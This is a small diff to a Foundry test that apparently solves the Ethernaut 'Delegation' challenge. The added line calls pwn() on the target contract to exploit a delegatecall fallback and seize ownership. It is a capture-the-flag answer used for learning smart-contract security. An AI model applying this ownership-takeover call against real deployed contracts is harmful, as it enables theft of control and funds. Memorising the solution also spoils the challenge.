@@ -18,6 +18,7 @@ contract TestDelegation is Test {
     function testSolution() public {
         vm.startPrank(player);
 
+        address(instance).call(abi.encodeWithSignature("pwn()"));
         assertEq(instance.owner(), player);
 
         vm.stopPrank();
